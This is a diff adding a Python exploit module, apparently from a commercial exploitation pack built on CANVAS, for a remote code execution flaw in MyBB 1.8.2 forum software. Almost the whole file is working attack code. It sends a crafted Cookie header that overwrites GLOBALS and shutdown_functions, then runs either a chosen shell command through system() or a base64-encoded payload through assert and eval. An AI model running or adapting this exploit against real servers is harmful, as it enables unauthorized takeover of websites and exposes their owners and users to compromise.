@@ -1,0 +1,97 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2015
+#
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from ExploitTypes.phpexploit import *
+import canvasengine
+import urllib
+import libs.spkproxy as spkproxy
+
+# GUI info
+NAME = "MyBB 1.8.2 Remote Code Execution Vulnerability"
+DESCRIPTION = "Remote code execution vulnerability in MyBB 1.8.2"
+VERSION = "0.1"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "MyBB"
+DOCUMENTATION["Date public"] = "2014.03.06"
+DOCUMENTATION["VersionsAffected"] = "MyBB <= 1.8.2"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "https://gist.github.com/chtg/e9824db42a8edf302b0e"
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = ""
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
+PROPERTY['VERSION'] = [ "All" ]
+
+NOTES = ""
+
+CHANGELOG = ""
+
+
+class theexploit(phpexploit):
+    def __init__(self):
+        phpexploit.__init__(self)
+        self.port = 80
+        self.host = ""
+        self.setVersions()
+        self.version = 0
+        self.done = 0
+        self.ssl = ""
+        self.name = NAME
+        self.basepath = "/"
+        self.basepaths = ["/mybb182/Upload/","/"]
+        self.command = None
+        self.basicauth_user = ""
+        self.basicauth_password = ""
+        self.hostname = None
+        self.verb = "GET"
+        self.content_type = "application/x-www-form-urlencoded"
+        self.targetpath = "index.php"
+        self.foundstrings = ["mybb"]
+        self.testfile = "index.php"        
+        return
+    
+    def geturlarguments(self):        
+        if self.command:
+            self.log("Command: %s"%self.command)
+            command = self.command
+            command = self.encode_php(command)
+            code = 'system'                                                        
+        else:
+            command = self.get_php_to_mosdef()
+            command = b64encode(command).strip()            
+            command = 'eval(base64_decode('+self.encode_php(command)+'));'
+            code = 'assert'            
+
+        exp = 'GLOBALS=1; shutdown_functions[0][function]=%s; shutdown_functions[0][arguments][]=%s'
+        exp = (exp) % (code, command)        
+        self.ua.addHeader("Cookie", exp)                             
+            
+        return "" 
+    
+    def parse_command_response(self, data):        
+        return data
+    
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret=standard_callback_commandline(app)
